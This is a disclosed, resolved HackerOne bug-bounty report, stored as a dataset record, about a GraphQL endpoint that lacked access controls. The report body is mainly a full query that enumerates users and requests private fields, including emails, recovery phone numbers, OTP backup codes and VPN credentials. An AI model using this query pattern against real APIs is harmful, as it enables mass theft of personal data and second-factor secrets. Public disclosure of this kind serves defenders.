---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '489146'
original_report_id: '489146'
title: Confidential data of users and limited metadata of programs and reports accessible
  via GraphQL
weakness: Information Disclosure
team_handle: security
created_at: '2019-01-31T15:32:20.974Z'
disclosed_at: '2019-02-03T10:57:19.220Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 995
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Confidential data of users and limited metadata of programs and reports accessible via GraphQL

## Metadata

- HackerOne Report ID: 489146
- Weakness: Information Disclosure
- Program: security
- Disclosed At: 2019-02-03T10:57:19.220Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
The GraphQL endpoint doesn't have access controls implemented properly.

**Description:**
Any attacker can get personally identifiable information of users of Hackerone such as email address, backup hash codes, facebook_user_id, account_recovery_phone_number_verified_at, totp_enabled, etc.

These are just some examples of fields which are getting leaked directly from GraphQL.

This is the request sent to GraphQL:

```
{
  id
  users()
  {
    total_count 
    nodes
    {
      _id
      name
      username
      email
      account_recovery_phone_number
      account_recovery_unverified_phone_number
      bounties
      {
        total_amount
      }
      otp_backup_codes
      i_can_update_username
      location
      year_in_review_published_at
      anc_triager
      blacklisted_from_hacker_publish
      calendar_token
      vpn_credentials
      {
        name
      }
      account_recovery_phone_number_sent_at
      account_recovery_phone_number_verified_at
      swag
      {
        total_count
      }
      totp_enabled
      subscribed_for_team_messages
      subscribed_for_monthly_digest
      sessions
      {
        total_count
      }
      facebook_user_id
      unconfirmed_email
    }
  }
```

Sample Response:
█████████

Please fix it.

Thanks,
Yash :)

## Impact

This could potentially leak many users' info

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
